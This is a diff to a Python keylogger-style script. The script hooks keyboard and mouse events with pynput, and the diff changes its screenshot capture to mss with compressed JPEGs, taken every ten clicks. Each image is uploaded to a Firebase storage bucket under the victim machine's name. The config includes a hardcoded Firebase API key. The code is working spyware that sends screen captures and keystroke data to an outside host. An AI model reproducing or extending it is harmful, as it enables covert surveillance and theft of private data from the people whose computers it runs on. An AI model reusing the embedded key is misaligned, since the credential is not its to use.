@@ -1,8 +1,9 @@
 import os
+from PIL import Image
+import mss as mss
 from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
-import pyautogui
 
 config = {
     'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
@@ -26,6 +27,7 @@ data = ''
 lastThreeKeys = []
 countDelete = 0
 clicks_counter = 0
+imgPath = 'screenshot.jpg'
 
 
 def on_press(key):
@@ -103,19 +105,25 @@ def printKey(key):
 
 
 def on_click(x, y, button, pressed):
-    global clicks_counter
+    global clicks_counter, full_currentTime, today_date
 
     clicks_counter += 1
-    if clicks_counter == 5:
+    if clicks_counter == 10:
         # take screenshot and upload to firebase storage
         clicks_counter = 0
 
-        myScreenshot = pyautogui.screenshot()
-        myScreenshot.save('screenshot.jpg')
+        with mss.mss() as sct:
+            sct.shot(output=imgPath)
 
-        storage.child(os.environ['COMPUTERNAME'] +
-                      '/screenshot_' + full_currentTime + '.jpg') \
-            .put('screenshot.jpg')
+            image = Image.open(imgPath)
+            image.save(imgPath, quality=20, optimize=True)
+
+            full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+            today_date = full_currentTime.split(' ')[1]
+
+            storage.child(os.environ['COMPUTERNAME'] +
+                          '/screenshot_' + full_currentTime + '.jpg') \
+                .put('screenshot.jpg')
 
 
 # Collect events of mouse clicks and keyboard keys
